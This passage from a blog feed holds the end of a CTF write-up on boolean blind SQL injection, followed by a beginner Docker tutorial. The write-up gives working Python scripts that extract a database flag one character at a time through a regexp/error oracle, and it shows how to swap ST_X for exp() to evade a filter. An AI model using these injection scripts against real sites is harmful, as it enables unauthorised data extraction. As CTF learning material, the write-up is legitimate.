class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">f</span><br><span class="line">g</span><br><span class="line">l</span><br><span class="line">0</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">-</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">[Finished in 7.7s]</span><br></pre></td></tr></table></figure><p>到这里就又没有思路了，通过阅读writeup后的想法是，发现可以利用正则的<code>^</code>来按照flag实现匹配得到flag。这里的^表示匹配开始行。利用它，我们第一个字符只能匹配f，第二个字符如果跟第一个字符连接起来，就是<code>^f?</code>，这里的？只能是l，最终我们可以按顺序得到payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^a&#39;;</span><br><span class="line">+------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^a&#39; |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;a&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;a&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^f&#39;;</span><br><span class="line">+------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^f&#39; |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  1 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def ord2hex(string):</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">for i in string:</span><br><span class="line">r &#x3D; hex(ord(i));</span><br><span class="line">r &#x3D; r.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">result &#x3D; result+r</span><br><span class="line">return &#39;0x&#39;+result</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28010&#x2F;index.php?cat&#x3D;&quot;</span><br><span class="line">tables &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#39;</span><br><span class="line">result&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10):</span><br><span class="line">for j in tables:</span><br><span class="line">payload &#x3D; &quot;1andIF((selectflagfromflag)regexpbinary%s,0,ST_X(111))&quot;%(ord2hex(&quot;^&quot;+result+j))</span><br><span class="line">r &#x3D; requests.get(url+payload);</span><br><span class="line">if  r.status_code&#x3D;&#x3D;200:</span><br><span class="line">result&#x3D;result+j</span><br><span class="line">print(result)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>执行这个脚本，有时候可以成功返回flag，有时候只返回flag{，师兄说因为{被当作了正则表达式里面的标记限定符，导致报错，但在本地尝试也没有报错</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/20.png" alt="20"></p><p>但是在执行过程中有时候会报错，有时候不会报错，如果报错就在花括号前面加入转义字符，实践证明，加上反义字符也可以正常执行语句。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/13.png" alt="13"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^flag\\&#123;&#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^flag\\&#123;&#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^flag\&#123;&#39;;</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^flag\&#123;&#39; |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                       1 |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">r = hex(ord(i));</span><br><span class="line">r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">result = result+r</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28050/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line"><span class="keyword">if</span> j ==<span class="string">&quot;&#123;&quot;</span> <span class="keyword">or</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">j=<span class="string">&#x27;\\&#x27;</span>+j</span><br><span class="line">payload = <span class="string">&quot;1andIF((selectflagfromflag)regexpbinary%s,0,ST_X(111))&quot;</span>%(ord2hex(<span class="string">&quot;^&quot;</span>+result+j))</span><br><span class="line">r = requests.get(url+payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  r.status_code==<span class="number">200</span>:</span><br><span class="line">result=result+j</span><br><span class="line">print(result.replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/14.png" alt="14"></p><h2 id="plus"><a href="#plus" class="headerlink" title="plus"></a>plus</h2><p>plus与它的原题很相似，直接用原题的payload试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28059/index.php?cat=1andIF((selectflagfromflag)regexpbinary0x66,0,ST_X(111))&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/22.png" alt="22"></p><p>进行调试发现ST_X，ST_GeomFromText，ST_MPointFromText都被过滤，到这里也就没啥思路了。然后，看到大佬分享的一篇文章，<a href="https://xz.aliyun.com/t/4914">SQL注入思考基于运行时错误的盲注</a>，发现我们只要找到一个函数代替ST_X函数就可以，发现可以利用exp函数的参数在大于709的情况下会导致sql语句执行失败。但是mysql版本不同会导致不同的结果。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/17.png" alt="17"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/18.png" alt="18"></p><p>据此编写脚本测试会不会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28014/index.php?cat=1andIF((selectflagfromflag)regexpbinary0x66,0,exp(4444))&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/21.png" alt="21"></p><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def ord2hex(string):</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">for i in string:</span><br><span class="line">r &#x3D; hex(ord(i));</span><br><span class="line">r &#x3D; r.replace(&#39;0x&#39;,&#39;&#39;)</span><br><span class="line">result &#x3D; result+r</span><br><span class="line">return &#39;0x&#39;+result</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28014&#x2F;index.php?cat&#x3D;&quot;</span><br><span class="line">tables &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#39;</span><br><span class="line">result&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,70):</span><br><span class="line">for j in tables:</span><br><span class="line">if j &#x3D;&#x3D;&quot;&#123;&quot; or j&#x3D;&#x3D;&quot;&#125;&quot;:</span><br><span class="line">j&#x3D;&#39;\\&#39;+j</span><br><span class="line">payload &#x3D; &quot;1andIF((selectflagfromflag)regexpbinary%s,0,exp(1111))&quot;%(ord2hex(&quot;^&quot;+result+j))</span><br><span class="line">r &#x3D; requests.get(url+payload);</span><br><span class="line"></span><br><span class="line">if  r.status_code&#x3D;&#x3D;200:</span><br><span class="line">result&#x3D;result+j</span><br><span class="line">print(result.replace(&#39;\\&#39;,&#39;&#39;))</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.nhooo.com/sql/func-mysql-binary.html">MySQL BINARY 函数使用</a></p><p><a href="https://blog.csdn.net/zhaoyangjian724/article/details/38644591">REGEXP_SUBSTR函数用法</a></p><p><a href="https://xz.aliyun.com/t/4914">SQL注入思考基于运行时错误的盲注</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;判断bool盲注&quot;&gt;&lt;a href=&quot;#判断bool盲注&quot; class=&quot;headerlink&quot; title=&quot;判断bool盲注&quot;&gt;&lt;/a&gt;判断bool盲注&lt;/h2&gt;&lt;p&gt;测试?cat=1和cat=2，cat=10000000返回的都是cat.png，输出1’ 返</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初识docker</title>
    <link href="http://www.yoyo2tong.xyz/2020/12/22/Docker%E7%9A%84%E4%B8%AD%E5%A4%AE%E4%BB%93%E5%BA%93/"/>
    <id>http://www.yoyo2tong.xyz/2020/12/22/Docker%E7%9A%84%E4%B8%AD%E5%A4%AE%E4%BB%93%E5%BA%93/</id>
    <published>2020-12-22T15:47:03.475Z</published>
    <updated>2021-06-05T11:10:44.821Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Docker的思想"><a href="#Docker的思想" class="headerlink" title="Docker的思想"></a>Docker的思想</h3><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/1.png"></p><h4 id="集装箱"><a href="#集装箱" class="headerlink" title="集装箱"></a>集装箱</h4><p>会将所有需要的内容放到不同的集装箱中，谁需要这些环境就直接拿到这个集装箱就可以了。</p><h4 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h4><p>运输的标准化：Docker有一个码头，所有上传的集装箱都放在了这个码头上，当谁需要某一个环境，就直接到码头搬运这个集装箱即可。</p><p>命令的标准化：Docker提供了一些标准化命令，帮助我们去获取集装箱等等操作。</p><p>提供了REST的API：衍生出了很多的图形化界面，例：Rancher</p><h4 id="隔离性"><a href="#隔离性" class="headerlink" title="隔离性"></a>隔离性</h4><p>Docker在运行集装箱的时候，会在Linux的内核中，单独的开辟一片空间，这片空间不会影响到其他程序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注册中心（超级码头，上面放的就是集装箱）</span><br><span class="line">镜像（集装箱）</span><br><span class="line">容器（运行起来的镜像）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">镜像，就是面向对象中的类，相当于一个模板。</span><br><span class="line">容器，就是类创建的实例，就是依据镜像这个模板创建出来的实体。</span><br></pre></td></tr></table></figure><h3 id="Docker的基本操作"><a href="#Docker的基本操作" class="headerlink" title="Docker的基本操作"></a>Docker的基本操作</h3><h4 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1，下载安装Docker的依赖环境</span><br><span class="line">yum -y install yum-utils device-mapper-persistent-mapper-persistent-data lvm2</span><br><span class="line">2，设置一下下载Docker的镜像源</span><br><span class="line">yum-config-manager --add-repo http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo</span><br><span class="line">3,安装Docker</span><br><span class="line">yum makacache fast</span><br><span class="line">yum -y install docker-ce</span><br><span class="line"></span><br><span class="line">4，启动，并设置为开机自动启动，测试</span><br><span class="line">启动Docker服务</span><br><span class="line">systemctl start docker</span><br><span class="line">设置开机自动启动</span><br><span class="line">systemctl enable docker</span><br><span class="line">测试</span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure><h3 id="Docker的中央仓库"><a href="#Docker的中央仓库" class="headerlink" title="Docker的中央仓库"></a>Docker的中央仓库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1,Docker官方的中央仓库，这个仓库是镜像最全的，但是下载速度较慢</span><br><span class="line">https:&#x2F;&#x2F;hub.docker.com&#x2F;</span><br><span class="line">2,国内的镜像网站：网易蜂巢，daoCloud</span><br><span class="line">http:&#x2F;&#x2F;c.163yun.com&#x2F;hub#&#x2F;home</span><br><span class="line">http:&#x2F;&#x2F;hub.daocloud.io&#x2F;</span><br><span class="line">3,在公司内部会采用私服的方式拉取镜像</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需要在&#x2F;etc&#x2F;docker&#x2F;demon.json</span><br><span class="line">&#123;</span><br><span class="line">&quot;registry-mirrors&quot;:[&quot;https:&#x2F;&#x2F;registry.docker-cn.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="镜像（集装箱）的操作"><a href="#镜像（集装箱）的操作" class="headerlink" title="镜像（集装箱）的操作"></a>镜像（集装箱）的操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1,拉取镜像到本地</span><br><span class="line">docker pull 镜像名称</span><br><span class="line">举个例子</span><br><span class="line">docker pull daocloud.io&#x2F;library&#x2F;tomcat:8.5.15-jre8</span><br><span class="line"></span><br><span class="line">2，查看全部本地镜像</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line">3,删除本地文件</span><br><span class="line">docker rmi 镜像的标识（前面两个字母）</span><br><span class="line"></span><br><span class="line">4，镜像的导入导出（不规范）</span><br><span class="line">将本地的镜像导入</span><br><span class="line">docker save -o 导出的路径 镜像id</span><br><span class="line"></span><br><span class="line">加载本地的镜像文件</span><br><span class="line">docker load -i 镜像文件</span><br><span class="line"></span><br><span class="line">修改镜像名称</span><br><span class="line">docker tag 镜像id 新镜像名称：版本</span><br></pre></td></tr></table></figure><h3 id="容器的操作（运行起来的镜像）"><a href="#容器的操作（运行起来的镜像）" class="headerlink" title="容器的操作（运行起来的镜像）"></a>容器的操作（运行起来的镜像）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">运行容器</span><br><span class="line">简单操作</span><br><span class="line">docker run 镜像的标识  镜像名称 [:tag]</span><br><span class="line">-d:代表后台运行容器</span><br><span class="line">-p:宿主机端口：容器端口：为了映射当前Linux的端口和容器的端口</span><br><span class="line">--name:容器名称：指定容器的名称</span><br><span class="line"></span><br><span class="line">docker run -d -p 宿主机端口：容器端口  --name  容器名称  镜像的标识|镜像名称[:tag]</span><br><span class="line">例：docker run -d -p 8081：8080  --name  b8</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps 查看正在运行的容器</span><br><span class="line">docker ps -a  查看全部的容器，包括没有运行</span><br><span class="line">docker ps -q  只查看容器得到标识</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看容器的日志</span><br><span class="line">docker logs -f 容器id</span><br><span class="line">-f ：可以滚动查看日志的最后几行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入到容器内部</span><br><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">删除容器(删除容器前，需要先停止容器)</span><br><span class="line"></span><br><span class="line">docker stop 容器id  停止指定的容器</span><br><span class="line">docker stop $(docker ps -qa)停止全部容器</span><br><span class="line"></span><br><span class="line">docker rm 镜像id  删除指定容器</span><br><span class="line">docker rm $(docker ps -qa)  删除全部容器</span><br></pre></td></tr></table></figure><h3 id="Docker自定义镜像"><a href="#Docker自定义镜像" class="headerlink" title="Docker自定义镜像"></a>Docker自定义镜像</h3><p>中央仓库上的镜像，也是Docker的用户自己上传过去的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1,创建一个Dockerfile的文件，并且指定自定义镜像信息。</span><br><span class="line">Dockerfile文件中常用的内容</span><br><span class="line">from:指定当前自定义镜像依赖的环境</span><br><span class="line">copy:将相对路径下的内容复制到自定义的镜像中</span><br><span class="line">workdir:声明镜像的默认工作目录</span><br><span class="line">cmd:需要执行的命令（在workdir下执行的，cmd可以写多个，以最后一个为准）</span><br></pre></td></tr></table></figure><p>镜像就是上面说的集装箱,仓库就是超级码头,容器就是我们运行程序的地方.docker运行程序的过程就是去仓库把镜像拉到本地,然后用一条命令把镜像运行起来变成容器.</p><p>build:构建,就是构建镜像.</p><p>ship:运输,运输镜像,从仓库和主机运输.</p><p>run:运行的镜像就是一个容器.</p><p>build,ship,run和镜像,仓库,容器是一一对应的.</p><h3 id="DockerFile的构建过程"><a href="#DockerFile的构建过程" class="headerlink" title="DockerFile的构建过程"></a>DockerFile的构建过程</h3><p><strong>基础知识：</strong></p><p>1，每个保留关键字（指令）都是必须是大写字母</p><p>2，执行从上到下顺序执行</p><p>3，#表示注释</p><p>4，每一个指令都会创建提交一个新的镜像层，并提交</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/2.jpg"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/docker/3.jpg"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1,编写自己的Dockfile文件</span></span><br><span class="line"><span class="keyword">FROM</span>  centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line">RUM yum -y install vim</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2，通过这个文件构建镜像</span></span><br><span class="line">docker bulid -f dockerfile文件路径 -t 创建的镜像名:[tag] .</span><br><span class="line"></span><br><span class="line"><span class="comment">#3，测试运行</span></span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[root@iz88m0zba2pfzdz dockerfile]<span class="comment"># docker build -f mydocker -t mycentos:0.1 .</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">27.65</span>kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">8</span> : <span class="keyword">FROM</span>  centos                   <span class="comment">#执行dockerfile第一行</span></span><br><span class="line">latest: Pulling <span class="keyword">from</span> library/centos       <span class="comment">#拉取官方的centos镜像</span></span><br><span class="line"><span class="number">7</span>a0437f04f83: Pull complete </span><br><span class="line">Digest: sha256:<span class="number">5528</span>e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1</span><br><span class="line">Status: Downloaded newer image for centos:latest</span><br><span class="line"> ---&gt; <span class="number">300</span>e315adb2f</span><br><span class="line">Step <span class="number">2</span>/<span class="number">8</span> : <span class="keyword">MAINTAINER</span> zoey&lt;<span class="number">2793988587</span>@qq.com&gt;</span><br><span class="line"> ---&gt; Running in <span class="number">6</span>fed6811727f</span><br><span class="line">Removing intermediate container <span class="number">6</span>fed6811727f</span><br><span class="line"> ---&gt; <span class="number">428884</span>ab35bb</span><br><span class="line">Step <span class="number">3</span>/<span class="number">8</span> : <span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"> ---&gt; Running in e3f315c1c37c</span><br><span class="line">Removing intermediate container e3f315c1c37c</span><br><span class="line"> ---&gt; ddbb9ad846b0</span><br><span class="line">Step <span class="number">4</span>/<span class="number">8</span> : <span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">35</span>a1e3ceba27</span><br><span class="line">Removing intermediate container <span class="number">35</span>a1e3ceba27</span><br><span class="line"> ---&gt; d7d770769889</span><br><span class="line">Step <span class="number">5</span>/<span class="number">8</span> : <span class="keyword">RUN</span><span class="bash"> yum -y install vim          <span class="comment">#下载vim</span></span></span><br><span class="line"> ---&gt; Running in f119b2fc3459</span><br><span class="line">CentOS Linux <span class="number">8</span> - AppStream                      <span class="number">2.2</span> MB/s | <span class="number">6.3</span> MB     <span class="number">00</span>:<span class="number">02</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - BaseOS                         <span class="number">1.2</span> MB/s | <span class="number">2.3</span> MB     <span class="number">00</span>:<span class="number">01</span>    </span><br><span class="line">CentOS Linux <span class="number">8</span> - Extras                         <span class="number">9.2</span> kB/s | <span class="number">8.6</span> kB     <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">Dependencies resolved.</span><br><span class="line"> <span class="keyword">From</span>       : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial</span><br><span class="line">Key imported successfully</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-<span class="number">1.20</span>.<span class="number">7</span>-<span class="number">15</span>.el8.x86_64         vim-common-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64    </span><br><span class="line">  vim-enhanced-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.x86_64 vim-filesystem-<span class="number">2</span>:<span class="number">8.0</span>.<span class="number">1763</span>-<span class="number">15</span>.el8.noarch</span><br><span 